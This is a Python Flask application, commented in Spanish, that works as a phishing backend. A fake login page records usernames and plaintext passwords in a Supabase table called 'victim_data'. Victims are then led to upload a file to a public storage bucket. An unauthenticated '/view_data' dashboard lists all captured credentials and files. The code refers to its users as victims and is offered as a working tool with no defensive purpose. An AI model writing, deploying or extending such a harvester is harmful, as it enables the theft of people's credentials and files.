# Importaciones necesarias
import os
import uuid
import time
import sys
from flask import Flask, render_template, request, redirect, url_for, session
# **CORRECCIÓN CLAVE:** Solo importamos lo necesario. Eliminamos SupabaseClient
# y el problemático SupabasePostgrestAPIError para mayor estabilidad.
from supabase import create_client, Client 


# ======================================================================
# CONFIGURACIÓN INICIAL DE FLASK Y SUPABASE
# ======================================================================
app = Flask(__name__)
# La clave secreta de Flask es necesaria para usar 'session'
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "fallback_secret_key_very_secret_123") 

# Variables de entorno para Supabase (usamos SUPABASE_ANON_KEY)
SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_ANON_KEY")

supabase = None

# Crear el cliente de Supabase una sola vez al inicio
try:
    if not SUPABASE_URL:
        # Esto lanzará un error si la variable falta
        raise ValueError("SUPABASE_URL no está configurada en el entorno.")
    if not SUPABASE_KEY:
        # Esto lanzará un error si la variable falta (Supabase Key)
        raise ValueError("SUPABASE_ANON_KEY no está configurada en el entorno.")

    # Inicialización del cliente
    supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
    print("Conexión con Supabase establecida.")
except ValueError as ve:
    # Captura si faltan las variables de entorno y lo imprime en los logs de error
    print(f"ERROR FATAL: Error de configuración de entorno: {ve}", file=sys.stderr)
    # Si las variables faltan, 'supabase' es None, lo cual manejamos en las rutas.
except Exception as e:
    # Captura cualquier otro error de inicialización
    print(f"ERROR FATAL: Error al inicializar Supabase: {e}", file=sys.stderr)
    supabase = None 


# ======================================================================
# RUTAS DE LA APLICACIÓN
# ======================================================================

# Ruta raíz para el formulario de inicio de sesión
@app.route('/')
def index():
    # Comprobación de que la conexión a Supabase se haya realizado correctamente
    if supabase is None:
        # Si la conexión falló al inicio, mostramos un error 500
        return render_template('error.html', error_message="Error de conexión al servidor de la base de datos (Verifique logs de Render para detalles)."), 500
        
    # Si la sesión ya tiene un victim_id, redirigir a la página de subida
    if 'victim_id' in session:
        return redirect(url_for('upload_page'))
        
    # Renderizar la página de inicio de sesión
    return render_template('index.html')

# Ruta para procesar el inicio de sesión (Método POST)
@app.route('/process_login', methods=['POST'])
def process_login():
    if supabase is None:
        return render_template('error.html', error_message="Fallo de conexión a Supabase."), 500
        
    try:
        username = request.form.get('username')
        password = request.form.get('password')
        
        # 1. Generar un ID único para la "víctima" y el timestamp
        victim_id = str(uuid.uuid4())
        timestamp = int(time.time()) # Timestamp en segundos

        # 2. Insertar los datos iniciales en la tabla 'victim_data'
        data_to_insert = {
            "username": username,
            "password": password,
            "victim_id": victim_id,
            "timestamp": timestamp,
            "file_name": "N/A - Archivo aún no subido",
            "file_url": "N/A - Archivo aún no subido"
        }
        
        # Insertar en la base de datos (Supabase)
        # Si hay un error aquí (RLS, nombre de tabla), será capturado por el 'except Exception'
        supabase.table('victim_data').insert(data_to_insert).execute()
        
        # 3. Guardar el victim_id en la sesión para el siguiente paso
        session['victim_id'] = victim_id
        
        # 4. Redirigir a la página de subida de archivos
        return redirect(url_for('upload_page'))

    # **CORRECCIÓN CLAVE:** Capturamos la excepción genérica y mostramos el error
    except Exception as e:
        # Esto capturará cualquier error, incluidos los de Supabase (Postgrest)
        error_message = f"Error de base de datos o interno: {e}"
        # Imprimimos el error completo en los logs de Render
        print(f"Error CRÍTICO en process_login: {e}", file=sys.stderr)
        return render_template('error.html', error_message=error_message), 500

# Ruta para mostrar el formulario de subida de archivos
@app.route('/upload')
def upload_page():
    # Asegurarse de que el usuario haya pasado por el login (tenga victim_id en sesión)
    if 'victim_id' not in session:
        return redirect(url_for('index'))
    # Renderizar la página de subida de archivos
    return render_template('upload.html')

# Ruta para procesar la subida de archivos (Método POST)
@app.route('/upload_file', methods=['POST'])
def upload_file():
    if supabase is None:
        return render_template('error.html', error_message="Fallo de conexión a Supabase."), 500

    # 1. Obtener el ID de la sesión
    victim_id = session.get('victim_id')
    if not victim_id:
        # En caso de que se pierda la sesión, redirigir al inicio
        return redirect(url_for('index'))

    # 2. Obtener el archivo del formulario
    if 'file' not in request.files or request.files['file'].filename == '':
        return render_template('error.html', error_message="No se encontró un archivo en la solicitud."), 400
        
    file = request.files['file']
    
    try:
        # 3. Preparar nombres y rutas
        original_filename = file.filename
        file_extension = os.path.splitext(original_filename)[1]
        # Creamos una ruta única para el almacenamiento: {victim_id}.{ext}
        storage_path = f"{victim_id}{file_extension}" 
        
        # 4. Subir el archivo a Supabase Storage (Bucket: archivos-victimas)
        # file.read() lee el contenido binario
        supabase.storage.from_('archivos-victimas').upload(
            file=file.read(),
            path=storage_path,
            file_options={"content-type": file.content_type or 'application/octet-stream'}
        )
        
        # 5. Obtener la URL pública del archivo
        # La respuesta es la URL como string
        file_url = supabase.storage.from_('archivos-victimas').get_public_url(storage_path)
        
        # 6. Actualizar la base de datos con el nombre y URL del archivo
        update_data = {
            "file_name": original_filename,
            "file_url": file_url
        }
        
        # Uso de .eq() para asegurar la actualización de la fila correcta
        supabase.table('victim_data').update(update_data).eq('victim_id', victim_id).execute()
        
        # 7. Limpiar la sesión 
        session.pop('victim_id', None)
        
        # 8. Redirigir a la página de agradecimiento
        return redirect(url_for('thank_you'))
        
    except Exception as e:
        print(f"Error CRÍTICO al subir el archivo o actualizar DB: {e}", file=sys.stderr)
        return render_template('error.html', error_message=f"Error crítico al subir y actualizar datos: {e}"), 500

# Ruta de agradecimiento (página de destino final)
@app.route('/thank_you')
def thank_you():
    return render_template('thank_you.html')


# Ruta del dashboard para ver los datos capturados
@app.route('/view_data')
def view_data():
    if supabase is None:
        return render_template('error.html', error_message="Fallo de conexión a Supabase para dashboard."), 500
        
    try:
        # Seleccionar todos los datos de la tabla 'victim_data' y ordenar por más reciente
        data_response = supabase.table('victim_data').select('*').order('timestamp', desc=True).execute()
        
        # Los datos se encuentran en 'data_response.data'
        victims_data = data_response.data
        
        # Renderizar el dashboard con los datos
        return render_template('dashboard.html', victims=victims_data)
        
    except Exception as e:
        print(f"Error al recuperar datos del dashboard: {e}", file=sys.stderr)
        return render_template('error.html', error_message=f"Error al cargar el dashboard: {e}"), 500

# Punto de entrada para Gunicorn/Render
if __name__ == '__main__':
    app.run(debug=True)
